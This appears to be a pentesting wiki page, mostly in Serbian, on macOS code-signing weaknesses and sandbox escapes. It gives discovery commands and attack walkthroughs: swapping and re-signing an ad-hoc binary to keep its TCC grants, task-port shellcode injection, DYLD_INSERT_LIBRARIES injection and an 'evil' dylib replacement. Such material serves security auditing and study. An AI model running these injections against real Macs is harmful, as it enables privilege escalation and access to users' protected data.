# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) kreira code signature sa **bez certificate chain-a** — to je hash koda bez verifikacije identiteta developera. Poreklo binary-ja ne može se povezati ni sa jednim developerom ili organizacijom.<sup>[[1]](#references)[[4]](#references)</sup>

Na Apple Silicon Mac računarima, svi executable fajlovi zahtevaju najmanje ad-hoc signature. To znači da ćete ad-hoc signatures pronaći u mnogim development alatima, Homebrew paketima i third-party utilities.

### Why This Matters

- **Nema verifikovanog identiteta** — binary može biti zamenjen bez detekcije putem identity-based provera
- Third-party ad-hoc binaries na **privileged positions** (FDA, daemon, helpers) predstavljaju high-priority targets
- U nekim konfiguracijama, ad-hoc signatures možda **neće biti verifikovane tako strogo** kao developer-signed code
- Ad-hoc signed binaries koji imaju **TCC grants** posebno su vredni — grants opstaju čak i ako se sadržaj binary-ja promeni (zavisi od toga kako je TCC postavio ključ za grant)

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Napad: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Procesi koji mogu da se debaguju (get-task-allow)

### Osnovne informacije

**`com.apple.security.get-task-allow`** entitlement (ili **`CS_GET_TASK_ALLOW`** flag) omogućava **bilo kom procesu da se poveže kao debugger**, da čita memoriju, menja registre, injectuje code i kontroliše izvršavanje.<sup>[[3]](#references)</sup>

Ovo je namenjeno **isključivo development buildovima**. Međutim, neki third-party binari isporučuju ovaj entitlement u produkciji.

> [!CAUTION]
> Produkcioni binar sa `get-task-allow` je **trenutni exploitation primitive**. Bilo koji lokalni proces može pozvati `task_for_pid()`, dobiti Mach task port cilja i injectovati proizvoljan code koji se izvršava sa entitlementima cilja, TCC grantovima i bezbednosnim kontekstom.

### Otkrivanje
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Napad: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Bez validacije biblioteka + DYLD okruženje

### Uklanjanje validacije biblioteka tokom izvršavanja

Privatni entitlement **`com.apple.private.security.clear-library-validation`** ne onemogućava validaciju biblioteka pri pokretanju procesa. Umesto toga, procesu omogućava da tokom izvršavanja pozove `csops(..., CS_OPS_CLEAR_LV, ...)` nad samim sobom. XNU tada uklanja `CS_REQUIRE_LV | CS_FORCED_LV`, pod uslovom da pozivalac poseduje entitlement i ispunjava dodatne provere handler-a. Shodno tome, proces može postati pogodna meta za library injection tek nakon što dođe do code path-a koji uklanja validaciju biblioteka.<sup>[[4]](#references)[[5]](#references)</sup>

### Smrtonosna kombinacija

Kada binary poseduje **oba**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (učitava bilo koji dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (prihvata DYLD env varijable)

Ovo je **zagarantovani code injection primitive** — `DYLD_INSERT_LIBRARIES` radi savršeno.

### Otkrivanje
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Napad: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Privremeni izuzeci za Sandbox

### Kako slabe Sandbox

Privremeni izuzeci za Sandbox (`com.apple.security.temporary-exception.*`) prave rupe u App Sandbox:<sup>[[2]](#references)</sup>

| Izuzetak | Šta omogućava |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Povezivanje sa XPC/Mach servisima na nivou celog sistema |
| `temporary-exception.files.absolute-path.read-write` | Čitanje/upisivanje datoteka izvan kontejnera aplikacije |
| `temporary-exception.iokit-user-client-class` | Otvaranje IOKit user-client veza |
| `temporary-exception.shared-preference.read-only` | Čitanje podešavanja drugih aplikacija |
| `temporary-exception.files.home-relative-path.read-write` | Pristup putanjama relativnim u odnosu na `~` |

### Mach-Lookup izuzeci = Sandbox Escape primitiv

Najopasniji izuzetak je **mach-lookup** — omogućava sandboxovanoj aplikaciji da komunicira sa privilegovanim daemonima:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Napad: Sandbox Escape putem Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Private Apple Entitlements

### Šta su

Entitlements sa prefiksom `com.apple.private.*` pružaju pristup **Apple-internal API-jima** koji nisu dokumentovani niti dostupni third-party developerima. Third-party binari sa private entitlements dobijaju ih putem enterprise sertifikata, MDM-a ili distribucije van App Store-a.

### Opasni Private Entitlements

| Entitlement | Mogućnost |
|---|---|
| `com.apple.private.tcc.manager` | Potpuno čitanje/upisivanje u TCC bazu podataka |
| `com.apple.private.tcc.allow` | Pristup određenim TCC servisima |
| `com.apple.private.security.no-sandbox` | Pokretanje bez sandbox-a |
| `com.apple.private.iokit` | Direktan pristup IOKit driverima |
| `com.apple.private.kernel.\*` | Pristup kernel interfejsu |
| `com.apple.private.xpc.launchd.job-label` | Registracija/upravljanje launchd poslovima |
| `com.apple.rootless.install` | Upisivanje u putanje zaštićene SIP-om |

### Otkrivanje
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Prilagođeni Sandbox profili (SBPL)

### Šta su

Binarni fajlovi mogu sadržati **prilagođene Sandbox profile** napisane u SBPL-u (Seatbelt Profile Language). Ovi profili mogu biti restriktivniji ILI **permisivniji** od podrazumevanog App Sandbox-a.

### Revizija prilagođenih profila
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Putanje biblioteka sa dozvolom upisa

### Šta su

Kada binary učita dynamic library sa putanje u koju trenutni korisnik može da **upisuje**, biblioteka može biti zamenjena malicioznim kodom.

### Otkrivanje
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Vodič za Code Signing](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` operacije i `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / rukovalac za `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
{{#include ../../../banners/hacktricks-training.md}}
